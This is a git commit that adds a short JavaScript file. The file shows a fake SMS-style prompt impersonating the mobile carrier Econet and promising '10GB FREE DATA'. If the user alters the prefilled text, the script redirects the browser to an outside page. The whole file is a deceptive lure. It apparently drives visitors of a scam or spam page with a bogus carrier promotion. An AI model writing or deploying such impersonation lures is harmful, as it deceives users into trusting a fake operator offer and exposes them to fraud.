d43cfb276fd9c317e9fe49f2855f671b8d26cb1b
mfednewblog8 <nsikakimoh68@gmail.com>
2026-05-28 05:12:22 +0100

    Create econet-wireless.js

---
+++ econet-wireless.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS: Dear Customer, As a token of appreciation, we are rewarding you with 10GB FREE DATA to stay connected, press OK To Activate Now ','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://ibaidad.com/econet.html';
+}
